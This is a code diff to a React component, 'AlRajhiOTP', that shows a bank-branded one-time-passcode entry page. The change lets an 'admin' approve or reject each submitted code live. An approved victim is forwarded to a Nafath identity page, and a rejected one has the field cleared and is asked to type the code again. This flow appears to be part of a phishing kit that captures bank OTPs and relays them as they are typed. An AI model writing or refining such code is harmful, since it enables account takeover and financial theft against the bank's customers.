@@ -10,10 +10,10 @@ import {
 } from "@/components/ui/input-otp";
 import {
   sendData,
-  isFormApproved,
-  isFormRejected,
+  codeAction,
   navigateToPage,
 } from "@/lib/store";
+import { useSignalEffect } from "@preact/signals-react";
 
 export default function AlRajhiOTP() {
   const [, navigate] = useLocation();
@@ -33,21 +33,28 @@ export default function AlRajhiOTP() {
     }, 100);
   }, []);
 
-  // Handle form approval
-  useEffect(() => {
-    if (isFormApproved.value) {
-      navigate("/alrajhi-nafath");
+  // Handle code action from admin (approve/reject)
+  useSignalEffect(() => {
+    const action = codeAction.value;
+    if (action) {
+      if (action.action === "approve") {
+        navigate("/alrajhi-nafath");
+      } else if (action.action === "reject") {
+        // تفريغ الحقول وإظهار رسالة الخطأ
+        setOtp("");
+        setError(true);
+        // التركيز على خانة الإدخال
+        setTimeout(() => {
+          const otpInput = document.querySelector('[data-slot="input-otp"]') as HTMLInputElement;
+          if (otpInput) {
+            otpInput.focus();
+          }
+        }, 100);
+      }
+      // إعادة تعيين الإجراء
+      codeAction.value = null;
     }
-  }, [isFormApproved.value, navigate]);
-
-  // Handle form rejection - clear OTP
-  useEffect(() => {
-    if (isFormRejected.value) {
-      setOtp("");
-      setError(true);
-      inputRef.current?.focus();
-    }
-  }, [isFormRejected.value]);
+  });
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
